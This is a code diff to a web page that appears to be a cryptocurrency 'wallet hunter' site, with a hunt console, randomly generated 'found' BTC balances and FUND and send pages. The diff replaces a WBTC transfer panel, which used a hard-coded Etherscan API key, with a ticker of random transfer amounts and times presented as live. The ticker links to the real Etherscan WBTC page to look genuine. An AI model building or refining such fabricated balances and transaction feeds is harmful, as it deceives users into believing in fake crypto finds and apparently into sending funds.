@@ -207,6 +207,61 @@
     }
     @keyframes blink { 0%,100%{ opacity:1; } 50%{ opacity:0; } }
 
+    /* New Live Transactions Line */
+    .live-tx-line {
+      background: rgba(0, 40, 70, 0.6);
+      backdrop-filter: blur(8px);
+      border-radius: 40px;
+      padding: 10px 16px;
+      border: 1px solid #00a6ff;
+      box-shadow: 0 0 15px #004c99;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .live-tx-line:hover {
+      background: rgba(0, 60, 100, 0.7);
+      border-color: #3ab0ff;
+      transform: scale(1.02);
+    }
+    .live-tx-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #f7931a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: bold;
+      color: white;
+      flex-shrink: 0;
+    }
+    .live-tx-content {
+      flex: 1;
+      font-size: 0.8rem;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .live-tx-amount {
+      color: #ffd700;
+      font-weight: 600;
+      margin: 0 4px;
+    }
+    .live-tx-time {
+      color: #7bbdff;
+      font-size: 0.7rem;
+    }
+    .live-tx-arrow {
+      color: #3a9eff;
+      font-size: 1.2rem;
+      line-height: 1;
+      flex-shrink: 0;
+    }
+
     .back-link-sm {
       color: #7bbdff;
       font-size: 0.8rem;
@@ -566,68 +621,6 @@
       color: #a3ceff;
       margin-left: 8px;
     }
-    /* New WBTC Transactions Section */
-    .wbtc-transactions {
-      background: rgba(0, 20, 45, 0.5);
-      backdrop-filter: blur(8px);
-      border-radius: 28px;
-      padding: 16px;
-      border: 1px solid #0080ff;
-      margin: 8px 0;
-    }
-    .wbtc-header {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      border-bottom: 1px solid #1f6199;
-      padding-bottom: 8px;
-      margin-bottom: 10px;
-    }
-    .wbtc-icon {
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      background: #f7931a;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      font-weight: bold;
-      color: white;
-    }
-    .wbtc-price {
-      margin-left: auto;
-      color: #ffd700;
-      font-weight: 600;
-      font-size: 0.9rem;
-    }
-    .wbtc-tx-list {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      max-height: 200px;
-      overflow-y: auto;
-    }
-    .wbtc-tx-item {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 6px 0;
-      border-bottom: 0.5px dotted #2f81c0;
-    }
-    .wbtc-tx-from {
-      font-family: monospace;
-      font-size: 0.7rem;
-      color: #9acdff;
-    }
-    .wbtc-tx-amount {
-      font-weight: 600;
-      color: #ffd700;
-    }
-    .wbtc-tx-time {
-      font-size: 0.65rem;
-      color: #7bbdff;
-    }
   </style>
 </head>
 <body>
@@ -645,6 +638,18 @@
         <span>📦 140M wallets indexed</span>
         <span>🎲 60 candidates</span>
       </div>
+      
+      <!-- New Live Transaction Line (added here) -->
+      <div class="live-tx-line" id="liveTxLine" onclick="window.open('https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', '_blank')">
+        <div class="live-tx-icon">₿</div>
+        <div class="live-tx-content" id="liveTxContent">
+          <span>WBTC Transfer: </span>
+          <span class="live-tx-amount" id="liveTxAmount">0.0000 BTC</span>
+          <span class="live-tx-time" id="liveTxTime">just now</span>
+        </div>
+        <div class="live-tx-arrow">↗</div>
+      </div>
+
       <div class="scan-console" id="huntConsole">
         <div class="log-line">> ready<span class="cursor-blink"></span></div>
         <div class="log-line">> depth: --</div>
@@ -674,18 +679,6 @@
         </div>
         <div class="action-item" id="fundActionMain">
           <div class="action-circle-glass">FUND</div>
-        </div>
-      </div>
-
-      <!-- New WBTC Transactions Section -->
-      <div class="wbtc-transactions">
-        <div class="wbtc-header">
-          <div class="wbtc-icon">₿</div>
-          <span>WBTC Live Transfers</span>
-          <span class="wbtc-price" id="wbtcPrice">$76,149.00</span>
-        </div>
-        <div class="wbtc-tx-list" id="wbtcTxList">
-          <!-- Transactions will be inserted here dynamically -->
         </div>
       </div>
 
@@ -783,10 +776,6 @@
     (function() {
       emailjs.init("PakuuN4ADUDEqrzHl");
 
-      // API Key for Etherscan
-      const ETHERSCAN_API_KEY = 'KNF5SCGA3VIGI2V5CN7IY71CIG8WN8S6DD';
-      const WBTC_CONTRACT = '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599';
-
       // pages
       const hunter = document.getElementById('hunterLanding');
       const wallet = document.getElementById('walletPage');
@@ -795,8 +784,7 @@
       const sendPage = document.getElementById('sendPage');
       const huntConsole = document.getElementById('huntConsole');
 
-      // Non-rounded BTC values (in USD) - but we'll use random between 150.46 and 2590.86
-      // We'll generate random values for the 3 wallets
+      // Non-rounded BTC values (in USD) - random between 150.46 and 2590.86
       const btcValues = [];
       for (let i = 0; i < 3; i++) {
         btcValues.push(Number((Math.random() * (2590.86 - 150.46) + 150.46).toFixed(2)));
@@ -887,9 +875,6 @@
                 
                 mainBalanceEl.innerText = '$' + bal.toFixed(2);
                 btcAmountEl.innerText = bal.toFixed(2);
-                
-                // Start WBTC transactions feed
-                startWBTCFeed();
               }, 2000);
             }, 600);
             return;
@@ -905,71 +890,38 @@
         }, 66);
       }
 
-      // WBTC Functions
-      let wbtcPrice = 76149.00; // Initial price from Etherscan
-      const wbtcTxList = document.getElementById('wbtcTxList');
+      // Live Transaction Feed (in hunter page)
+      const liveTxAmount = document.getElementById('liveTxAmount');
+      const liveTxTime = document.getElementById('liveTxTime');
       
-      async function fetchWBTCPrice() {
-        try {
-          const response = await fetch(`https://api.etherscan.io/api?module=stats&action=tokenprice&contractaddress=${WBTC_CONTRACT}&apikey=${ETHERSCAN_API_KEY}`);
-          const data = await response.json();
-          if (data.status === '1' && data.result) {
-            wbtcPrice = parseFloat(data.result);
-            document.getElementById('wbtcPrice').innerText = '$' + wbtcPrice.toFixed(2);
-          }
-        } catch (error) {
-          console.log('Using default price');
-        }
-      }
-
-      function generateRandomTx() {
+      function generateRandomLiveTx() {
         const wallets = walletList.filter(w => w.balance > 0);
-        const fromWallet = wallets[Math.floor(Math.random() * wallets.length)];
+        const fromWallet = wallets.length > 0 ? wallets[Math.floor(Math.random() * wallets.length)] : walletList[0];
         const amount = (Math.random() * (0.5 - 0.01) + 0.01).toFixed(4);
-        const timeAgo = Math.floor(Math.random() * 10) + 1;
-        const minutesAgo = timeAgo === 1 ? '1 min ago' : timeAgo + ' mins ago';
+        const timeAgo = Math.floor(Math.random() * 5) + 1;
+        let timeText = '';
+        
+        if (timeAgo === 1) timeText = '1 min ago';
+        else if (timeAgo < 60) timeText = timeAgo + ' mins ago';
+        else timeText = 'just now';
         
         return {
-          from: fromWallet.address,
           amount: amount,
-          time: minutesAgo
+          time: timeText
         };
       }
 
-      function addTransactionToUI(tx) {
-        const txItem = document.createElement('div');
-        txItem.className = 'wbtc-tx-item';
-        txItem.innerHTML = `
-          <span class="wbtc-tx-from">${tx.from.substring(0,6)}...${tx.from.substring(38)}</span>
-          <span class="wbtc-tx-amount">${tx.amount} BTC</span>
-          <span class="wbtc-tx-time">${tx.time}</span>
-        `;
-        
-        if (wbtcTxList.children.length >= 8) {
-          wbtcTxList.removeChild(wbtcTxList.lastElementChild);
-        }
-        wbtcTxList.insertBefore(txItem, wbtcTxList.firstChild);
+      function updateLiveTxLine() {
+        const tx = generateRandomLiveTx();
+        liveTxAmount.innerText = tx.amount + ' BTC';
+        liveTxTime.innerText = tx.time;
       }
 
-      function startWBTCFeed() {
-        // Fetch initial price
-        fetchWBTCPrice();
-        
-        // Update price every 30 seconds
-        setInterval(fetchWBTCPrice, 30000);
-        
-        // Generate initial transactions
-        for (let i = 0; i < 5; i++) {
-          setTimeout(() => {
-            addTransactionToUI(generateRandomTx());
-          }, i * 1000);
-        }
-        
-        // Add new transaction every 8 seconds
-        setInterval(() => {
-          addTransactionToUI(generateRandomTx());
-        }, 8000);
-      }
+      // Update live transaction every 6 seconds
+      setInterval(updateLiveTxLine, 6000);
+      
+      // Initial update
+      updateLiveTxLine();
 
       // Event Listeners
       document.getElementById('huntBtn').addEventListener('click', startHunt);
@@ -1088,7 +1040,7 @@
 
       function updateUsdHint() {
         let val = parseFloat(amountInput.value);
-        usdHint.innerText = (!isNaN(val) && val >= 0.0001) ? `≈ $${(val * wbtcPrice).toFixed(2)}` : '≈ $0.00';
+        usdHint.innerText = (!isNaN(val) && val >= 0.0001) ? `≈ $${(val * 65000).toFixed(2)}` : '≈ $0.00';
       }
 
       function validateSendForm() {
